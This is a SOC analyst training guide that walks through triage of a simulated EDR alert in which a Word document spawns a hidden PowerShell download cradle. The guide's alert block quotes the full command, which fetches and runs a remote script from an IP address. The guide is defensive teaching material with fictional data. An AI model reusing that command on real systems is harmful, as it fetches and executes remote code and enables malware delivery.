# Guide 01 — Alert Triage Workflow

## Objective

By the end of this guide you will be able to:

* Follow a structured alert triage process from receipt to disposition
* Apply a priority matrix to determine alert urgency
* Enrich an alert with context before making a triage decision
* Document triage decisions consistently

**Estimated time:** 30 minutes

**Level:** Basic

**Prerequisites:** Session 01–03 reading (SOC concepts, SIEM basics, log analysis)

---

## Background

Alert triage is the first step in the SOC response cycle.
When a detection rule fires, an alert is sent to the SOC queue.
The Tier 1 analyst's job is to determine, as quickly as possible:

1. Is this a real event?
1. Is this a malicious event?
1. What priority should this be?

Poor triage leads to either missed real incidents (under-triaging) or wasted effort on noise (over-triaging).

---

## Step 1: Receive and Acknowledge the Alert

When an alert appears in your queue, immediately **acknowledge** it to:

* Stop SLA timers from running unattended
* Signal to other analysts that this alert is being worked

**In a real SOC:** click "Acknowledge" in your SIEM/ticketing system

**For this guide:** record the timestamp in your notes

### Alert Details (simulated)

```text
Alert ID:      ALT-2025-08847
Timestamp:     2025-04-10 10:42:33 UTC
Rule:          SOC-RULE-0421: Suspicious PowerShell Download Cradle
Severity:      High
Source:        EDR (CrowdStrike)

Details:
  Hostname:    LAPTOP-FIN-017
  User:        patricia.chen@globalbank.com
  Process:     powershell.exe
  Parent:      WINWORD.EXE
  Command:     powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://89.248.165.100/update.ps1')"
  Hash:        (not available — running process)
  Network:     LAPTOP-FIN-017 → 89.248.165.100:80
```

---

## Step 2: Initial Plausibility Check

Before spending time enriching, quickly ask: **Is this alert technically plausible?**

Common reasons to immediately close/tune:

* The alert fired because of known maintenance tooling
* The rule has known false positive patterns
* The sensor had a known issue at alert time

**For our alert:** PowerShell download cradle from an Office parent is a well-known malware delivery TTP.
This is plausible.
Proceed.

---

## Step 3: Enrich the Alert

Gather additional context to make an informed decision.

### 3.1 Asset Context

Look up the hostname and user in your asset database.

**LAPTOP-FIN-017:**

* Department: Finance
* User: Patricia Chen, Senior Accountant
* Role: Standard user (no admin rights)
* Asset criticality: **High** (Finance dept, access to payment systems)
* Last patch: 2025-03-15 (25 days ago)

**Key question:** Would Patricia legitimately run a PowerShell download cradle?
Almost certainly not.

### 3.2 User Context

* Has this user triggered alerts before? → Check ticket history (none found in last 30 days)
* Is the user on leave/travel? → Check HR system (in office today)
* Recent IT changes for this user? → IT change log (no changes)

### 3.3 Network Context

Look up the destination IP: `89.248.165.100`

**Steps:**

```console
# On your analyst workstation (or via SIEM lookup):

# 1. Reverse DNS
# (simulate) nslookup 89.248.165.100 → no PTR record (suspicious)

# 2. WHOIS
# ASN: AS208091 — CLOUDIE-AS, Netherlands
# Registered: 2024-11-23 (very recent — suspicious)
# No abuse contact
```

**VirusTotal lookup for the IP:**

* Malicious: 8/92 engines
* Tags: malware, C2

**The URL: http://89.248.165.100/update.ps1**

* VirusTotal: 22/92 malicious
* Category: Trojan downloader

This is highly suspicious.
The IP is a recently-registered VPS with malware detections.
The URL serves a script named `update.ps1` (a common malware disguise).

### 3.4 Lateral Movement Context

Search the SIEM for other activity from this host in the last hour:

```text
index=endpoints host=LAPTOP-FIN-017 earliest=-1h
| stats count by EventCode, CommandLine
```

**Simulated results:**

* EventCode 4688 (process creation): 15 events, mostly normal Office and browser activity
* At 10:41: `WINWORD.EXE` opened `Invoice_April_2025.docx` (from email)
* At 10:42: PowerShell spawned (this alert)
* No lateral movement detected yet

### 3.5 Summary of Enrichment

| Factor | Finding | Risk Indicator |
|--------|---------|---------------|
| Asset criticality | High (Finance) | High risk |
| User role | Standard user | High risk |
| User behavior | Normal - no prior alerts | Neutral |
| Destination IP | Known malicious (VT 8/92) | High risk |
| Destination URL | Known malicious (VT 22/92) | High risk |
| Trigger mechanism | Office spawning PS | High risk |
| Lateral movement | None detected yet | Moderate (early stage) |

---

## Step 4: Apply the Priority Matrix

Using the matrix from the reading material:

* **Alert severity:** High (rule classification)
* **Asset criticality:** High

**Priority determination:** HIGH → Escalate to Tier 2

---

## Step 5: Make a Triage Decision

Based on enrichment, decide: **True Positive, False Positive, or Needs More Investigation?**

**Decision: True Positive — High confidence**

Evidence:

* Known-malicious destination IP (VT 8/92)
* Known-malicious URL (VT 22/92)
* TTPs match Office document macro delivering PS download cradle
* High-criticality asset in Finance department

---

## Step 6: Document the Triage

Create a ticket (or in this guide, write the triage note):

```markdown
## Triage Note — ALT-2025-08847

**Triage Analyst:** [Your Name]
**Triage Time:** 2025-04-10 10:47 UTC (5 minutes after alert)

**Decision: TRUE POSITIVE — Escalating to Tier 2**

**Evidence Summary:**
- WINWORD.EXE spawned PowerShell download cradle at 10:42 UTC
- Destination IP 89.248.165.100 flagged by 8/92 VT engines
- Destination URL flagged by 22/92 VT engines
- No legitimate reason for Patricia Chen to run PS download cradle

**Context:**
- Asset LAPTOP-FIN-017 is High criticality (Finance dept)
- User is standard employee, no admin rights
- No lateral movement detected in last 1 hour

**Initial Actions Taken:**
- Alert acknowledged at 10:44 UTC
- Triage completed at 10:47 UTC
- Ticket created and escalated to Tier 2

**Recommended Next Steps (Tier 2):**

1. Isolate LAPTOP-FIN-017 immediately

2. Retrieve and analyze update.ps1 from VT sandbox
3. Search for other hosts communicating with 89.248.165.100
4. Check Patricia's email for suspicious attachment (Invoice_April_2025.docx)
5. Consider credential reset for patricia.chen@globalbank.com
```

---

## Step 7: Escalate

With the triage note complete:

1. Assign the ticket to a Tier 2 analyst
1. Set priority to HIGH
1. Notify Tier 2 via your chat channel: "Escalated ALT-2025-08847 — suspected malicious macro delivery on Finance host"

---

## Knowledge Check

1. What are the three questions a Tier 1 analyst needs to answer during triage?
1. Why is asset context important when determining priority?
1. What made the destination IP suspicious in this scenario?
1. What would have to be different about this alert for you to close it as a false positive?
1. Why is triage documentation important even for clear true positives?

---

## Common Mistakes to Avoid

* **Jumping to a conclusion** without enrichment → leads to both missed threats and wasted effort
* **Skipping documentation** → creates accountability gaps and slows future analysis
* **Not checking for related activity** → misses early-stage attacks that are easy to contain
* **Taking automated blocking action without Tier 2 approval** → at Tier 1, your job is triage, not response
